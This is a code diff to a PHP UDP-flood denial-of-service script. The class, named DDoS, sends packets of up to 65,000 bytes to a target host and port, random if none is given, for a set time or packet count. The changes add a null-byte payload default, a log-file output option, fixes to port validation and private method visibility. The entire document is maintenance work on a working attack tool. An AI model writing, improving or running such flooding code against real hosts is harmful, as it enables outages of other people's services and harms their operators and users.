@@ -43,6 +43,9 @@ define('DDOS_MAX_EXECUTION_TIME',0);
 define('DDOS_DEFAULT_PACKET_SIZE',	65000 );
 define('DDOS_MAX_PACKET_SIZE',		65000 );
 
+// Default byte to send
+define('DDOS_DEFAULT_BYTE',"\x00");
+
 // Loggin functions
 define('DDOS_LOG_DEBUG',			4 );
 define('DDOS_LOG_INFO',				3 );
@@ -82,7 +85,8 @@ class DDoS {
 			'pass'	=> 	'',
 			'bytes' =>	'',
 			'verbose'=> DDOS_LOG_INFO,
-			'format'=> 'text'
+			'format'=> 'text',
+			'output'=> ''
 	);
 	
 	
@@ -173,6 +177,7 @@ class DDoS {
 		$this->println("packet	OPTIONAL number of packets to send to the target, required if time is not used");
 		$this->println("bytes	OPTIONAL size of the packet to send, defualt: ".DDOS_DEFAULT_PACKET_SIZE);
 		$this->println("format	OPTIONAL output format, (text,json,xml), default: text");
+		$this->println("output	OPTIONAL logfile, save the output to file");
 		$this->println("verbose	OPTIONAL 0: debug, 1:info, 2:notice, 3:warning, 4:error, default: info");
 		$this->println();
 		$this->println("Note: 	If both time and packet are specified, only time will be used");
@@ -190,7 +195,7 @@ class DDoS {
 	private function attack(){
 		
 		$packets = 0;
-		$message = str_repeat("0", $this->get_param('bytes'));
+		$message = str_repeat(DDOS_DEFAULT_BYTE, $this->get_param('bytes'));
 		
 		$this->log('DDos UDP flood started');
 		
@@ -264,11 +269,11 @@ class DDoS {
 	 * @return boolean	True if the packet was sent
 	 */
 	private function udp_connect($h,$p,$out){
-	
+		
 		if(0 == $p) {
 			$p = rand(1,rand(1,65535));
 		}
-		
+
 		$this->log("Trying to open socket udp://$h:$p",DDOS_LOG_DEBUG);
 		$fp = @fsockopen('udp://'.$h, $p, $errno, $errstr, 30);
 	
@@ -336,13 +341,13 @@ class DDoS {
 		else {
 			$this->log("Setting host to " . $this->get_param('host'));
 		}
-
 		if("" != $this->get_param('port') && !$this->is_valid_port($this->get_param('port'))) {
-			$this->log("Invalid port", DDOS_LOG_NOTICE);
-		}
-		else {
+			$this->log("Invalid port", DDOS_LOG_WARNING);
 			$this->log("Setting port to random",DDOS_LOG_NOTICE);
 			$this->set_param('port', 0);
+		}
+		else {
+			$this->log("Setting port to ".$this->get_param('port'));
 		}
 		
 		if(is_numeric($this->get_param('bytes')) && 0 < $this->get_param('bytes')) {
@@ -363,9 +368,13 @@ class DDoS {
 			exit(1);
 		}
 		else {
-			// Just to be use that users does not submit a wrong time and correct packet
+			// Just to be sure that users does not submit a wrong time "example: a,-1" and correct packet
 			$this->set_param('time', abs(intval($this->get_param('time'))));
 			$this->set_param('packet', abs(intval($this->get_param('packet'))));
+		}
+		
+		if('' != $this->get_param('output')) {
+			$this->log("Setting log file to " .$this->get_param('output'),DDOS_LOG_INFO);
 		}
 		
 	}
@@ -497,7 +506,7 @@ class DDoS {
 	/**
 	 * Print the output of the script
 	 */
-	public function print_output() {
+	private function print_output() {
 		switch($this->get_param('format')) {
 			case DDOS_OUTPUT_FORMAT_JSON: {
 				echo json_encode($this->output);	
@@ -528,10 +537,20 @@ class DDoS {
 	 * @param string 	$message 	Message
 	 * @param integer 	$code		Log code
 	 */
-	public function log($message,$code = DDOS_LOG_INFO) {
+	private function log($message,$code = DDOS_LOG_INFO) {
 		if($code <= $this->get_param('verbose') && $this->get_param('format') == DDOS_OUTPUT_FORMAT_TEXT) {
 			$this->println('['.$this->log_labels[$code] . '] ' . $message);	
 		}
+	}
+	
+	/**
+	 * Save output to file
+	 * @param unknown $message
+	 */
+	private function log_to_file($message) {
+		if('' != $this->get_param('output')) {
+			file_put_contents($this->get_param('output'), $message, FILE_APPEND | LOCK_EX);
+		}	
 	}
 	
 	
@@ -540,8 +559,9 @@ class DDoS {
 	 * @param string 	$message Message to print
 	 * @param integer 	$indent Number of tabs to print before the message
 	 */
-	function println($message = '') {
+	private function println($message = '') {
 		echo $message . "\n";
+		$this->log_to_file($message . "\n");
 		ob_flush();
 		flush();
 	}
